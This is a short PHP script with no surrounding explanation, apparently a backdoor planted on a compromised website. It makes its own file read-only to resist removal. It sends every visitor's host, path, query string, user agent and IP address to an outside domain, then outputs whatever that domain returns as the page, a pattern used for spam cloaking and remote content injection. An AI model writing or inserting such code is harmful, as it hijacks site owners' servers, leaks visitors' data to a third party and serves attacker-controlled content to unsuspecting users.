<?php
set_time_limit(0);
header("Content-Type:text/html;charset=gb2312");
date_default_timezone_set('PRC');
@chmod($_SERVER['SCRIPT_FILENAME'], 0444);
$key = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$aaaa = $_SERVER['PHP_SELF'];
$aaa = 'http://ashx.lhlsplml.com/';
$sc = str_replace(' ', '', $key);
$uip = isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : '';

$target = $aaa . '?&X&http://' . $_SERVER['HTTP_HOST'] . $aaaa . '?' . $_SERVER['QUERY_STRING'] . '&X&' . $sc . '&X&' . $uip;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

if (!empty($key)) {
    curl_setopt($ch, CURLOPT_USERAGENT, $key);
}

$response = curl_exec($ch);

if ($response === false) {
    echo 'Curl Error: ' . curl_error($ch);
} else {
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    echo $response;
}

curl_close($ch);
?>
